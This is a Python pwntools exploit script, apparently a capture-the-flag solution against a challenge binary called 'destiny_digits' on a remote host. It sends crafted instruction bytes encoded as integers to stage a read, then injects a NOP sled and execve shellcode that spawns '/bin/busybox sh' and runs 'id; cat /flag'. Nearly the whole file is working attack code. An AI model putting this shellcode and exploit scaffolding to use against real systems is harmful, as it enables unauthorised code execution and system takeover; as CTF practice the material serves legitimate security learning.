#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./destiny_digits')

host, port = "flu.xxx", "10110"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

# set register to load shellcode over us in rwx zone
pl = b''
pl += b'\x09\xf1\x5b\x5b'	# pop rbx / pop rbx
pl += b'\x09\xf1\x5e\x5f'	# pop rsi / pop rdi
pl += b'\x09\xf1\x87\xfd'	# xchg ebp, edi  (will clear edi)
pl += b'\x09\xf1\xb6\x02'	# mov dh,2
# read shellcode on rwx zone
pl += b'\xb3\x03\x0f\x05'	# mov bl, 0x26 / syscall	(read 0, rsi, 0x100)
pl += b'\xb3\x0a\xff\xe6'       # jmp rsi

# transform payload in good format
pl = pl.ljust(128*4, b'\xff')
for i in range(128):
 sla('? ', str(u32(pl[i*4:(i*4)+4])))

p.recvuntil('...\n', drop=True)

# shellcode that executes /bin/busybox sh
shellc=asm('''
  push 59
  pop rax
  cdq
  lea rdi,fname[rip]
  push rdx
  lea rsi,[rdi+(arg1-fname)]
  push rsi
  push rdi
  push rsp
  pop rsi
  push 59
  pop rax
  syscall
fname:
  .string "/bin/busybox"
arg1:
  .string "sh"

''')
# send nopsled+shellcode
p.send(b'\x90'*0x60+shellc)
# got shell now
p.sendline('id; cat /flag')

p.interactive()

